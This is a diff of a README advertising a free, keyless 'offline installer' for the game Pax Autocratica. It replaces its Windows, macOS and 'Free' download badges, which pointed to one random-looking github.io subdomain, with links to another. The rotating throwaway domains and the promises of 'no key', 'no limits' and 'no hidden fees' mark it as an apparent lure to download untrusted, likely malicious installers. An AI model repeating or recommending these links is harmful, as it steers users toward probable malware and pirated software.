@@ -1,8 +1,8 @@
 # 🎮 Pax Autocratica Offline Installer Free [2026]
 
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
-[![Free](https://img.shields.io/badge/Free-No_Key-brightgreen?style=for-the-badge)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://bvgutwastvpd.github.io/windows-pkg/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bvgutwastvpd.github.io/macos-pkg/)
+[![Free](https://img.shields.io/badge/Free-No_Key-brightgreen?style=for-the-badge)](https://bvgutwastvpd.github.io/windows-pkg/)
 
 🎮 **Pax Autocratica Offline Installer Free** — professional offline installer for Pax Autocratica. Works without internet access during setup, no extra subscriptions required. Download for 2026. Full offline installation. No limits. No hidden fees.
 
